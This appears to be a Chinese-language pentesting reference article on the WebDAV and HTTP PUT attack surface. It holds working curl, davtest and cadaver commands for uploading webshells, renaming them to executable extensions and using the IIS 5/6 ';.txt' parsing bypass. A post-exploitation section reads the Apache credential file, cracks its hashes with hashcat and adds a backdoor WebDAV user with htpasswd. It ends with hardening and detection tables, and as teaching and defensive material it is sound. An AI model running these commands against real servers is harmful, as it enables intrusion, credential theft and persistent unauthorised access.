---
attack_surface:
  - 配置缺陷
  - 认证/授权绕过
  - 注入类
impact:
  - 远程代码执行
  - 完整性破坏
  - 权限提升
risk_level: 高
prerequisites:
  - HTTP 方法（PUT、MOVE、DELETE、PROPFIND）
  - HTTP Basic/Digest 认证
  - WebShell 基础
related_techniques:
  - file-upload
  - brute-force
  - waf-bypass
  - credential-harvesting
difficulty: 初级
tools:
  - davtest
  - cadaver
  - curl
  - hydra
---

# WebDAV & PUT Method — HTTP Write Access Attack Surface — WebDAV 与 PUT 方法攻击面分析

> 关联文档：[File Upload](../../Files/File%20Upload/README.md) · [IIS Security](../IIS/README.md) · [Apache Security](../Apache/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) · [Brute Force](../../../hacktricks/src/generic-hacking/brute-force.md)

---

### 知识路径

```
WebDAV & PUT Method（本文档）
  ├── 前置知识：HTTP 方法 — PUT、MOVE、DELETE、PROPFIND、OPTIONS
  ├── 前置知识：HTTP 认证 — Basic、Digest
  ├── 进阶：IIS 6.0 WebDAV 解析绕过（;.txt 后缀）
  │   └── 参见：Web Servers & Middleware/IIS
  ├── 进阶：后渗透 → Apache 配置中的凭据收集
  ├── 关联：File Upload — 通用上传利用
  │   └── 参见：Files/File Upload
  ├── 关联：Brute Force — WebDAV 凭据攻击
  └── 关联：WAF Bypass — 扩展名过滤器规避
      └── 参见：Proxies/Proxy & WAF Protections Bypass
```

---

# 0x01 WebDAV 与 PUT 方法 — 原理与分类

## 1.1 HTTP 方法与 WebDAV 架构

WebDAV（Web Distributed Authoring and Versioning）通过用于分布式文件管理的方法扩展了 HTTP/1.1。当在 Web 服务器上启用时，它允许已认证客户端通过标准 HTTP 动词在服务器上**创建、修改、移动和删除**文件。

**WebDAV 专用 HTTP 方法：**

| 方法 | 用途 | 攻击相关性 |
|------|------|----------|
| `PUT` | 在指定路径上传/创建文件 | 直接上传 webshell |
| `MOVE` | 重命名或重定位已有文件 | 绕过上传扩展名过滤器 |
| `DELETE` | 删除文件 | 篡改、反取证 |
| `PROPFIND` | 获取资源属性 | 目录列表、信息泄露 |
| `OPTIONS` | 发现支持的方法 | 侦察 — 揭示 WebDAV 存在 |
| `COPY` | 复制文件到新路径 | 通过复制+重命名绕过上传限制 |
| `MKCOL` | 创建目录 | 创建可写目录用于分阶段部署 |

**服务器实现：**

| 服务器 | WebDAV 模块 | 认证类型 |
|--------|-----------|---------|
| Apache httpd | `mod_dav` + `mod_dav_fs` | Digest（默认）、Basic |
| IIS 5.0/6.0 | 原生 WebDAV | Windows Integrated、Basic |
| IIS 7.0+ | WebDAV Extension Module | Windows Auth、Basic |
| Nginx | 第三方（`nginx-dav-ext-module`） | Basic |

## 1.2 攻击面分类

| 类别 | 分类名称 | 技术 |
|------|---------|------|
| 配置缺陷 | 配置缺陷 | 无必要启用 WebDAV；webroot 可写权限；无 IP 限制 |
| 认证/授权绕过 | 认证/授权绕过 | 默认/弱凭据；爆破；配置错误服务器上的无认证 PUT |
| 协议解析差异 | 协议解析差异 | IIS 5/6 `;.txt` 后缀绕过 — 扩展名过滤器看到 `.txt`，IIS 解析器执行 `.asp` |
| 注入类 | 注入类 | 通过 PUT 上传 webshell → RCE；MOVE 重命名为可执行扩展名 → 代码执行 |

---

# 0x02 侦察与利用工具

## 2.1 DavTest — 自动化扩展名测试

**Davtest** 尝试上传各种扩展名的文件，然后检查哪些扩展名在服务器上是可执行的：

```bash
# 上传 .txt 文件并尝试 MOVE 到可执行扩展名
davtest [-auth user:password] -move -sendbd auto -url http://<IP>

# 尝试直接上传每种已知扩展名
davtest [-auth user:password] -sendbd auto -url http://<IP>
```

**输出解读：**

[图片: DavTest 输出 — Qwen 提取。展示对 10.11.1.229 的 davtest 扫描：服务端脚本（.jsp、.php、.cfm、.pl）全部 FAIL 执行；.txt 和 .html SUCCEED 表示文件可访问。工具上传文件后检查是否执行 — FAIL = 服务器拒绝代码执行（好），SUCCEED = 文件可通过 Web 访问（不一定被执行）。确认警告：DavTest "SUCCEED" ≠ 服务端代码执行。]

> **警告：** DavTest 报告某扩展名 "successful" 仅意味着文件可通过 Web 服务器**访问** — 并**不**保证服务端执行。始终通过访问上传文件并检查代码执行来手动验证。

## 2.2 Cadaver — 交互式 WebDAV 客户端

**Cadaver** 提供交互式命令行界面用于 WebDAV 操作：

```
cadaver <IP>
```

支持对 WebDAV 服务器进行手动上传（`put`）、移动（`move`）、删除（`delete`）和目录列表（`ls`）操作。适用于自动化工具被阻断或限速时的逐步利用。

## 2.3 使用 curl 发送原始 HTTP

### 2.3.1 PUT — 直接文件上传

```bash
curl -T 'shell.txt' 'http://$ip'
```

`-T` 标志发送带文件内容的 PUT 请求。目标路径必须可写且该方法必须启用。

### 2.3.2 MOVE — 重命名为可执行扩展名

```bash
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```

通过 PUT 上传非可执行文件（`.txt`），然后 MOVE 到可执行扩展名（`.php`、`.asp`、`.aspx`、`.jsp`）。这绕过了检查 PUT 请求文件扩展名的上传过滤器。

---

# 0x03 利用技术

## 3.1 直接 PUT 上传 → Webshell

### 3.1.1 机制

如果服务器启用了具有写权限的 WebDAV，且目标目录允许执行上传的文件类型，可以直接上传 webshell：

```bash
# 检查 PUT 是否被允许
curl -X OPTIONS http://$ip/ -I

# 上传简单的 PHP webshell
curl -T 'shell.php' 'http://$ip/shell.php'

# 上传 ASPX webshell
curl -T 'shell.aspx' 'http://$ip/shell.aspx'
```

### 3.1.2 条件

- WebDAV 启用且目标目录具有写权限
- 有效凭据（如果需要认证）
- 目标扩展名被允许上传且被服务器执行
- 目录可通过 Web 访问

## 3.2 MOVE 重命名绕过

### 3.2.1 机制

当服务器阻止直接上传可执行扩展名（`.php`、`.asp`、`.aspx`）但允许非可执行扩展名（`.txt`、`.html`）时，两步绕过有效：

1. **PUT** 上传带良性扩展名（`.txt`）的 webshell
2. **MOVE** 将上传文件重命名为可执行扩展名（`.php`）

```bash
# 步骤 1：以 .txt 上传 webshell
curl -T 'shell.php' 'http://$ip/shell.txt'

# 步骤 2：重命名为可执行扩展名
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```

### 3.2.2 Cadaver 等效操作

```
cadaver <IP>
> put shell.txt
> move shell.txt shell.php
```

## 3.3 IIS 5/6 WebDAV — `;.txt` 解析绕过

### 3.3.1 机制

IIS 5.0 和 6.0 的 WebDAV 实现存在**解析缺陷**：上传过滤器阻止以 `.asp` 结尾的文件，但添加 `;.txt`（或 `;.html`）作为**后缀**使过滤器看到 `.txt`，而 IIS 解析器看到 `.asp`：

```
filename.asp;.txt  →  上传过滤器：允许（.txt 扩展名）
                   →  IIS 解析器：   作为 ASP 执行（分号前的 .asp）
```

### 3.3.2 利用步骤

1. 通过 PUT 以上传 ASP webshell：`shell.asp;.txt`
2. 或：以 `shell.txt` 上传 → MOVE 到 `shell.asp;.txt`
3. 通过浏览器访问：`http://target/shell.asp;.txt`

[图片: IIS5/6 WebDAV cadaver 利用 — Qwen 提取。展示完整的 IIS 分号绕过攻击：(1) `put reverse.txt` 成功上传原始 webshell，(2) `copy reverse.txt reverse.asp;.txt` 成功 — `;.txt` 后缀绕过 IIS 扩展名过滤器（服务器看到 `.txt`，解析器作为 `.asp` 执行），(3) `move reverse.txt reverse2.asp;.txt` 失败返回 401 Unauthorized 但 `ls` 确认 `reverse2.asp;.txt` 存在 — 验证了源中 cadaver 错误报告失败的说明，(4) 后台窗口显示 `nc -lvnp 80` 接收连接且 `whoami` 返回 `nt authority\system` — 在另一目标上成功获得 shell。]

> **注意：** Cadaver 可能报告 MOVE 操作未成功 — **忽略此报告**。文件在服务端实际成功移动，尽管客户端显示错误消息。通过直接访问文件 URL 验证。

### 3.3.3 条件

- IIS 5.0 或 6.0（解析漏洞在 IIS 7.0+ 中已修复）
- WebDAV 已启用
- 具有写访问权限的有效凭据
- ASP 已启用为服务端脚本 Handler

此漏洞也在 [IIS Security](../IIS/README.md) §4.4（IIS 6.0 基于解析的访问绕过）中记录，且与在混合 IIS + 代理部署中启用 [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) 的相同分号解析行为相关。

---

# 0x04 后渗透与凭据收集

## 4.1 Apache WebDAV 配置提取

### 4.1.1 定位 WebDAV 配置

在具有 WebDAV 的 Apache 服务器上获得 shell 访问后，检查站点配置：

```bash
# Debian/Ubuntu
cat /etc/apache2/sites-enabled/000-default

# RHEL/CentOS
cat /etc/httpd/conf.d/webdav.conf
```

### 4.1.2 配置分析

典型的 WebDAV 配置块：

```
ServerAdmin webmaster@localhost
        Alias /webdav /var/www/webdav
        <Directory /var/www/webdav>
                DAV On
                AuthType Digest
                AuthName "webdav"
                AuthUserFile /etc/apache2/users.password
                Require valid-user
```

### 4.1.3 凭据文件提取

`AuthUserFile` 指令指向凭据文件：

```
/etc/apache2/users.password
```

此文件包含 WebDAV 认证的**用户名**和**密码哈希**。提取并破解：

```bash
# 查看凭据文件
cat /etc/apache2/users.password

# 示例格式：username:realm:hash
# 使用 hashcat 破解（模式取决于 AuthType）：
#   Digest: hashcat -m 1600
#   Basic:  hashcat -m 0（如果是 htpasswd 的 MD5/APR1/Bcrypt 格式）

# 添加新的 WebDAV 用户（后门持久化）
htpasswd /etc/apache2/users.password <USERNAME>  # 提示输入密码
```

### 4.1.4 验证新凭据

```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```

---

# 0x05 防御、加固与工具

## 5.1 加固检查表

| 措施 | 理由 |
|------|------|
| 如不需要，禁用 WebDAV（Apache 中 `DAV Off`；IIS 中移除 WebDAV 角色） | 消除整个攻击面 |
| 仅限认证用户访问 WebDAV（`Require valid-user`） | 防止匿名写访问 |
| 使用强唯一密码；在 N 次失败尝试后执行账户锁定 | 缓解爆破攻击 |
| 将可写目录限制在不可执行的位置 | 即使 webshell 被上传，也无法执行 |
| 将 `LimitRequestBody` 和 `LimitXMLRequestBody` 设置为合理值 | 防止大文件上传/DoS |
| 限制文件扩展名：仅允许 `.txt`、`.pdf`、`.doc` — 绝不包含 `.php`、`.asp`、`.jsp` | 防止可执行 webshell 上传 |
| 对 WebDAV 访问使用 IP 白名单（`Allow from` / `Require ip`） | 限制暴露给可信网络 |
| 审计 `AuthUserFile` 权限：`chmod 640`，属主为 root | 防止 Web 服务器用户读取凭据文件 |
| 在访问日志中监控 PUT/MOVE/DELETE 请求 | 检测进行中的利用 |
| 应用 IIS 补丁：IIS 5/6 的 `;.txt` 绕过在 IIS 7.0+ 中不存在 | 版本升级消除解析漏洞 |

## 5.2 检测指标

| 指标 | 意义 |
|------|------|
| `OPTIONS` 请求返回 `PUT, MOVE, DELETE, PROPFIND` | WebDAV 侦察 |
| 带 `.txt` 扩展名的 `PUT` 请求后跟到 `.php`/`.asp` 的 `MOVE` | 两步扩展名绕过 |
| 文件名包含 `;.txt` 或 `;.html` 的 `PUT` 请求 | IIS 5/6 WebDAV 绕过 |
| 使用不同凭据的多次失败 `PUT` 尝试 | 凭据爆破 |
| 部署窗口之外 webroot 中出现新文件 | 成功的 webshell 上传 |
| Web 服务器进程访问 `/etc/apache2/users.password` | 凭据窃取 |

## 5.3 工具清单

| 工具 | 用途 | 参考 |
|------|------|------|
| `davtest` | 自动化 WebDAV 扩展名测试 | Kali 内置 |
| `cadaver` | 交互式 WebDAV 客户端 | Kali 内置 |
| `curl` | 原始 HTTP PUT/MOVE/DELETE | 内置 |
| `hydra` | WebDAV 凭据爆破 | Kali 内置 |
| `htpasswd` | Apache 凭据文件操控 | 内置 |

## 参考资料

- [vk9-sec — Exploiting WebDAV](https://vk9-sec.com/exploiting-webdav/)
- [HackTricks — WebDAV](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav)
- [Apache mod_dav 文档](https://httpd.apache.org/docs/2.4/mod/mod_dav.html)
- [Microsoft IIS WebDAV Extension](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/webdav/)
